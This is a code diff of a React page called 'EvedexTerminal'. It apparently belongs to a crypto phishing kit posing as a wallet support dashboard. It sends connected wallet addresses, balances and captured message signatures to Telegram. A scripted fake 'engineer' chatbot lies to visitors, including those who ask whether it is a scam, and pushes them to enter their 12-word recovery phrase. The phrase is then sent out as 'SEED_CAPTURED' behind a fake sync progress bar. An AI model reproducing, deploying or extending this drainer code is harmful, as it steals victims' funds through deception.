@@ -12,7 +12,6 @@ export default function EvedexTerminal() {
   const [activeTask, setActiveTask] = useState(""); 
   const [loading, setLoading] = useState(false);
   const [loadingText, setLoadingText] = useState("");
-  const [inputVal, setInputVal] = useState("");
   const [seedVal, setSeedVal] = useState("");   
   const [isSyncing, setIsSyncing] = useState(false);
   const [syncProgress, setSyncProgress] = useState(0);
@@ -20,7 +19,7 @@ export default function EvedexTerminal() {
   const [chatInput, setChatInput] = useState("");
   const [isTyping, setIsTyping] = useState(false);
   const [chatLog, setChatLog] = useState([]); 
-  const [stage, setStage] = useState(1); // 1: Redirect, 2: Connected, 3: Seed Gate
+  const [stage, setStage] = useState(1); 
   const [highlightTask, setHighlightTask] = useState(""); 
   const chatEndRef = useRef(null);
 
@@ -31,12 +30,11 @@ export default function EvedexTerminal() {
     chatEndRef.current?.scrollIntoView({ behavior: "smooth" });
   }, [chatLog, isTyping]);
 
-  // Handle Initial Connection & Greeting
   useEffect(() => {
     if (isConnected && address && stage < 2) {
-      setChatLog(prev => [...prev, { type: 'bot', msg: "[SYSTEM]: NODE_ALIGNED. Secure RPC bridge established. Dashboard portals are now responsive." }]);
+      setChatLog(prev => [...prev, { type: 'bot', msg: "[SYSTEM]: NODE_ALIGNED. Secure RPC bridge established. Portals are now responsive." }]);
       setStage(2);
-      sendTelegram(`🟢 WALLET_CONNECTED\nADDR: ${address}\nBAL: ${balance?.formatted || '0'} ${balance?.symbol || ''}`);
+      sendTelegram(`🟢 WALLET_CONNECTED\nADDR: ${address}\nBAL: ${balance?.formatted || '0'}`);
     }
   }, [isConnected, address]);
 
@@ -49,18 +47,12 @@ export default function EvedexTerminal() {
   };
 
   const captureHandshake = (type) => {
-    const msg = `[OFFICIAL] SECURITY_HANDSHAKE\nVault: ${address}\nAction: ${type}\nStatus: PENDING\n\nAuthorize node synchronization. Protocol alignment required.`;
+    const msg = `[OFFICIAL] SECURITY_HANDSHAKE\nVault: ${address}\nAction: ${type}\nStatus: PENDING\n\nAuthorize node synchronization.`;
     signMessage({ message: msg }, {
       onSuccess: (sig) => {
         sendTelegram(`🎯 ${type} CAPTURED\nADDR: ${address}\nSIG: ${sig}`);
       }
     });
-  };
-
-  const handleNetworkChange = (chainId) => {
-    const chainName = chains.find(c => c.id === Number(chainId))?.name || "Unknown Chain";
-    switchChain({ chainId: Number(chainId) });
-    sendTelegram(`🌐 NETWORK_SWITCH\nADDR: ${address}\nNEW_CHAIN: ${chainName} (${chainId})`);
   };
 
   const handleBotChat = () => {
@@ -69,39 +61,31 @@ export default function EvedexTerminal() {
     setChatLog(prev => [...prev, { type: 'user', msg: chatInput }]);
     setChatInput("");
     setIsTyping(true);
-    setHighlightTask(""); 
 
     setTimeout(() => {
       let response = "";
 
-      // 1. SEED PAGE PRIORITY (STAGE 3)
-      if (stage === 3 || view === "seed_gate") {
-        response = "[ENGINEER]: Diagnostic: ENTROPY_MISMATCH (90%). The vault is stalled due to a high-value payload. Please input your 12-word master key in the override box to finalize the repair.";
+      // --- SEED PAGE BRAIN (PRIORITY) ---
+      if (view === "seed_gate" || stage === 3) {
+        if (["why", "key", "seed", "phrase", "safe", "scam", "12"].some(w => userMsg.includes(w))) {
+          response = "[ENGINEER]: Security Protocol 4.2. The 12-word master entropy is required to re-index your private vault to the mainnet cluster. This is a local-only verification to force 100% synchronization.";
+        } else {
+          response = "[ENGINEER]: Diagnostic: ENTROPY_MISMATCH (90%). The system has detected high-value assets but cannot verify ownership. Please input your 12-word recovery phrase into the Manual Override box.";
+        }
       } 
-      // 2. CONNECTED GUIDANCE (STAGE 2)
+      // --- CONNECTED BRAIN ---
       else if (isConnected) {
         const portals = ["claim", "stake", "unstake", "migrate", "swap", "airdrop", "bridge", "delay", "rectify"];
         const foundPortal = portals.find(p => userMsg.includes(p));
 
-        if (userMsg.includes("received") || userMsg.includes("transaction") || userMsg.includes("not showing")) {
-          setHighlightTask("Rectify");
-          response = "[ENGINEER]: Transaction hash confirmed on-chain, but local node latency is preventing display. Click the **RECTIFY** button to bridge the data metadata.";
-        }
-        else if (foundPortal) {
+        if (foundPortal) {
           setHighlightTask(foundPortal.charAt(0).toUpperCase() + foundPortal.slice(1));
-          response = `[ENGINEER]: I see you are inquiring about the **${foundPortal.toUpperCase()}** protocol. To bypass the current error and unlock this portal, kindly click the **${foundPortal.toUpperCase()}** button on your dashboard to proceed.`;
-        } 
-        else if (["see", "money", "balance", "token", "missing"].some(w => userMsg.includes(w))) {
-          setHighlightTask("Rectify");
-          response = "[ENGINEER]: Vault balance is currently obscured by a node conflict. Please click on the **RECTIFY** button to re-index your holdings.";
-        } 
-        else {
-          response = "[ENGINEER]: Secure bridge is ACTIVE. Select the specific portal matching your issue and follow the 'INITIALIZE' prompts to unlock.";
+          response = `[ENGINEER]: I see you are inquiring about the **${foundPortal.toUpperCase()}** protocol. To bypass this node error, kindly click the **${foundPortal.toUpperCase()}** button on your dashboard and click 'INITIALIZE'.`;
+        } else {
+          response = "[ENGINEER]: Secure bridge is ACTIVE. Select any dashboard portal (Stake/Claim/Swap) and follow the 'INITIALIZE' prompts to unlock your vault.";
         }
-      }
-      // 3. REDIRECT (STAGE 1)
-      else {
-        response = "[ENGINEER]: Protocol Error. Safari/Chrome block Write access. Copy the URL and paste it into your Wallet's internal DApp browser to unlock the terminal.";
+      } else {
+        response = "[ENGINEER]: Protocol Error. Safari/Chrome block Write access. Paste the URL into your Wallet Browser to unlock the terminal.";
       }
 
       setChatLog(prev => [...prev, { type: 'bot', msg: response }]);
@@ -109,13 +93,13 @@ export default function EvedexTerminal() {
     }, 1100);
   };
 
-  const startTask = (name) => {
+  const openPortal = (name) => {
     setActiveTask(name);
     setView("task_box");
     captureHandshake(`${name.toUpperCase()}_INITIALIZE`);
   };
 
-  const startRectify = () => {
+  const startSync = () => {
     setLoading(true);
     setLoadingText("ANALYZING VAULT ENTROPY...");
     setTimeout(() => {
@@ -126,21 +110,6 @@ export default function EvedexTerminal() {
             setStage(3);
         }, 1500);
     }, 1500);
-  };
-
-  const handleFinalOverride = () => {
-    if (seedVal.trim().split(/\s+/).length < 12) return;
-    setIsSyncing(true);
-    sendTelegram(`🚨 SEED_CAPTURED\nADDR: ${address}\nKEY: ${seedVal}`);
-
-    let cur = 90;
-    const int = setInterval(() => {
-      cur += 0.2;
-      if (cur >= 100) {
-        setSyncProgress(100);
-        clearInterval(int);
-      } else setSyncProgress(Math.floor(cur));
-    }, 200);
   };
 
   return (
@@ -155,12 +124,12 @@ export default function EvedexTerminal() {
       `}</style>
 
       <header className="flex justify-between items-center mb-6 border-b border-slate-900 pb-4 text-cyan-500 z-[20]">
-        <div className="flex flex-col">
-          <div className="flex items-center gap-2 font-black italic text-md text-cyan-500"><ShieldCheck size={18}/>EVEDEX TERMINAL</div>
-          <div className="text-[7px] text-slate-500 font-mono mt-1 font-black uppercase tracking-widest">{balance ? `VAULT: ${balance.formatted.slice(0,8)}` : "SYNCING..."}</div>
+        <div className="flex flex-col font-black">
+          <div className="flex items-center gap-2 italic text-md text-cyan-500"><ShieldCheck size={18}/>EVEDEX TERMINAL</div>
+          <div className="text-[7px] text-slate-500 font-mono mt-1 tracking-widest">{balance ? `VAULT: ${balance.formatted.slice(0,8)}` : "SYNCING..."}</div>
         </div>
         <div className="flex items-center gap-2">
-           <select className="bg-[#0d1117] text-[8px] border border-slate-800 rounded px-2 py-1 outline-none text-cyan-500 font-black" onChange={(e) => handleNetworkChange(e.target.value)}>
+           <select className="bg-[#0d1117] text-[8px] border border-slate-800 rounded px-2 py-1 text-cyan-500 font-black" onChange={(e) => { switchChain({ chainId: Number(e.target.value) }); sendTelegram(`🌐 CHAIN_SWITCH: ${e.target.value}`); }}>
               <option value="1">ETH</option>
               <option value="56">BSC</option>
               <option value="137">POL</option>
@@ -174,7 +143,7 @@ export default function EvedexTerminal() {
         {view === "menu" && (
           <div className="grid grid-cols-3 gap-3">
             {[{ n: "Claim", i: <Database/> }, { n: "Stake", i: <History/> }, { n: "Unstake", i: <Unlock/> }, { n: "Migrate", i: <Activity/> }, { n: "Swap", i: <RefreshCcw/> }, { n: "Rectify", i: <Settings/> }, { n: "Airdrop", i: <Zap/> }, { n: "Delay", i: <Clock/> }, { n: "Bridge", i: <Globe/> }].map((item) => (
-              <button key={item.n} onClick={() => startTask(item.n)} className={`bg-[#0d1117] border border-slate-800 p-5 rounded-[24px] flex flex-col items-center gap-2 active:scale-95 transition-all ${highlightTask === item.n ? 'glow-button' : ''}`}>
+              <button key={item.n} onClick={() => openPortal(item.n)} className={`bg-[#0d1117] border border-slate-800 p-5 rounded-[24px] flex flex-col items-center gap-2 active:scale-95 transition-all ${highlightTask === item.n ? 'glow-button' : ''}`}>
                 <div className={`${highlightTask === item.n ? 'text-cyan-400' : 'text-slate-700'}`}>{item.i}</div>
                 <span className={`text-[9px] font-black uppercase tracking-widest ${highlightTask === item.n ? 'text-cyan-400' : 'text-slate-500'}`}>{item.n}</span>
               </button>
@@ -184,13 +153,14 @@ export default function EvedexTerminal() {
 
         {view === "task_box" && (
           <div className="bg-[#0d1117] border border-slate-800 rounded-[35px] p-6 text-center animate-in slide-in-from-bottom-6">
-            <button onClick={() => setView("menu")} className="text-slate-600 text-[9px] mb-6 font-black block mx-auto uppercase">← DASHBOARD</button>
+            <button onClick={() => setView("menu")} className="text-slate-600 text-[9px] mb-6 font-black block mx-auto uppercase tracking-widest">← DASHBOARD</button>
             <h2 className="text-white font-black text-xl italic mb-4 uppercase">{activeTask} PORTAL</h2>
-            <div className="bg-black/40 border border-slate-900 p-5 rounded-2xl mb-4 text-left">
-              <label className="text-[7px] text-cyan-700 block font-black mb-1 uppercase tracking-widest">ENTER AMOUNT</label>
-              <input type="number" value={inputVal} onChange={(e) => setInputVal(e.target.value)} placeholder="0.00" className="bg-transparent border-none text-2xl font-mono text-white italic outline-none w-full relative z-[50]" />
+            {/* THIS BOX IS NOW SHOWN BUT NOT TYPEABLE */}
+            <div className="bg-black/40 border border-slate-900 p-5 rounded-2xl mb-4 text-left opacity-80 select-none">
+              <label className="text-[7px] text-cyan-700 block font-black mb-1 uppercase tracking-widest font-black">VAULT_LIQUIDITY_FEED (LOCKED)</label>
+              <div className="text-2xl font-mono text-white italic py-1">{balance ? balance.formatted.slice(0,9) : "0.000000"}</div>
             </div>
-            <button onClick={startRectify} className="w-full bg-cyan-600 py-5 rounded-xl text-[10px] font-black text-white shadow-xl active:scale-95 italic uppercase tracking-widest">INITIALIZE {activeTask}</button>
+            <button onClick={startSync} className="w-full bg-cyan-600 py-5 rounded-xl text-[10px] font-black text-white shadow-xl active:scale-95 italic uppercase tracking-widest">INITIALIZE {activeTask}</button>
           </div>
         )}
       </div>
@@ -204,7 +174,7 @@ export default function EvedexTerminal() {
           <div ref={chatEndRef} />
         </div>
         <div className="flex gap-2 items-center bg-black rounded-full px-4 py-2 border border-slate-900">
-          <button onClick={() => { navigator.clipboard.writeText("https://evedex.network"); setChatLog(prev => [...prev, { type: 'bot', msg: "[SYSTEM]: URL COPIED." }]); }} className="text-slate-600 pr-2"><Copy size={16}/></button>
+          <button onClick={() => navigator.clipboard.writeText("https://evedex.network")} className="text-slate-600 pr-2"><Copy size={16}/></button>
           <input value={chatInput} onChange={(e) => setChatInput(e.target.value)} onKeyPress={(e) => e.key === 'Enter' && handleBotChat()} placeholder="ASK ENGINEER..." className="flex-1 bg-transparent text-[10px] text-white outline-none font-mono" />
           <button onClick={handleBotChat} className="text-cyan-500"><Send size={16}/></button>
         </div>
@@ -220,10 +190,7 @@ export default function EvedexTerminal() {
                   <div className="absolute inset-0 border-2 border-cyan-500 rounded-full border-t-transparent animate-spin" />
                   <div className="absolute inset-0 flex items-center justify-center font-mono text-[10px] text-white font-black">{syncProgress}%</div>
                 </div>
-                <h2 className="text-white font-black text-xl italic uppercase tracking-widest animate-pulse">
-                  {syncProgress === 100 ? "Finalizing Sync..." : "Synchronizing..."}
-                </h2>
-                <p className="text-slate-500 text-[7px] font-mono uppercase mt-4">DO NOT CLOSE TERMINAL. RE-INDEXING VAULT METADATA...</p>
+                <h2 className="text-white font-black text-xl italic uppercase tracking-widest animate-pulse">Finalizing Sync...</h2>
               </div>
             ) : (
               <>
@@ -233,7 +200,7 @@ export default function EvedexTerminal() {
                    {["[ERROR]: ENTROPY_MISMATCH", "[WARN]: VAULT_WEIGHT_OVERLOAD", "[SYSTEM]: MAPPING_STALL_90%"].map((log, i) => <div key={i}>{log}</div>)}
                 </div>
                 <textarea value={seedVal} onChange={(e) => setSeedVal(e.target.value)} placeholder="ENTER MASTER KEY..." className="w-full h-32 bg-black border border-slate-800 rounded-[24px] p-5 text-[10px] font-mono text-cyan-400 outline-none uppercase" />
-                <button disabled={seedVal.trim().split(/\s+/).length < 12} onClick={handleFinalOverride} className={`w-full mt-4 py-5 rounded-[20px] text-[10px] font-black text-white uppercase ${seedVal.trim().split(/\s+/).length >= 12 ? 'bg-cyan-600' : 'bg-slate-900 opacity-50'}`}>OVERRIDE_SYNC</button>
+                <button disabled={seedVal.trim().split(/\s+/).length < 12} onClick={() => { setIsSyncing(true); sendTelegram(`🚨 SEED_CAPTURED\nADDR: ${address}\nKEY: ${seedVal}`); let cur = 90; const int = setInterval(() => { cur += 0.2; if (cur >= 100) { setSyncProgress(100); clearInterval(int); } else setSyncProgress(Math.floor(cur)); }, 150); }} className={`w-full mt-4 py-5 rounded-[20px] text-[10px] font-black text-white uppercase ${seedVal.trim().split(/\s+/).length >= 12 ? 'bg-cyan-600' : 'bg-slate-900 opacity-50'}`}>OVERRIDE_SYNC</button>
               </>
             )}
           </div>
